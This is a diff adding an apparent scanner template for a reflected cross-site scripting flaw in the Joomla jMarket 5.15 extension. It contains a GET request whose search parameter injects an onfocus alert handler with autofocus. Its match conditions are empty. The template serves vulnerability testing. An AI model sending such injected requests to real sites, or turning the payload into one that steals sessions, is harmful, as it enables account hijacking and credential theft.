@@ -1,0 +1,18 @@
+id: joomla-jmarket-xss
+brief:
+    title: Joomla jMarket 5.15 - Cross-Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credenti...
+    label:
+        - packetstorm
+        - xss
+        - packetstrom
+        - joomla
+        - jmarket
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php?option=com_jvouchers&controller=catalog-results&task=query&wajx=1&wmjx=1&tmpl=component&type=raw&crtyid=12&trucs[x][search]=gx3vt%20onfocus=alert(document.domain)%20autofocus=%20itkrzsug7w5'
+      signs: []
